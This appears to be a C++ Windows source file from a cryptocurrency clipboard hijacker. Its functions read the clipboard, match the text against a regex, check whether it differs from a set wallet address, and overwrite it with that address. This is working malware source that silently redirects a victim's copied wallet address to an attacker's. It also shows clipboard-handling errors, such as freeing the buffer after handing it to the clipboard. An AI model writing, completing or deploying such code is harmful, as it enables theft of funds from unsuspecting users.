#pragma once
#include "clipboard.h"

char* Clipboard_ReadData()
{
	HANDLE hClipboard = GetClipboardData(CF_TEXT);

	return (char*)hClipboard;
}

DWORD Clipboard_MarkChanges(DWORD clipboard)
{
	clipboard = GetClipboardSequenceNumber();
	CloseClipboard();
	return clipboard;
}

bool Clipboard_CompareToRegex(std::string clipboard, std::regex regExp)
{
	bool flag;

	flag = regex_match(clipboard, regExp);

	return flag;
}

bool Clipboard_WalletIsDifferent(std::string compareTo)
{
	bool flag;
	std::string tempClipboard;

	tempClipboard = Clipboard_ReadData();
	flag = tempClipboard.compare(compareTo);

	return flag;
}

void Clipboard_ReplaceWallet(std::string wallet)
{
	std::string newClipboard = wallet;

	HGLOBAL hClipboardBuffer = GlobalAlloc(GMEM_MOVEABLE, newClipboard.length() + 1);

	if (!hClipboardBuffer) {
		CloseClipboard();
		return;
	}

	/* Replace clipboard buffer */
	memcpy(GlobalLock(hClipboardBuffer), newClipboard.c_str(), newClipboard.length() + 1);
	GlobalUnlock(hClipboardBuffer);

	EmptyClipboard();
	SetClipboardData(CF_TEXT, hClipboardBuffer);

	GlobalFree(hClipboardBuffer);

	CloseClipboard();
}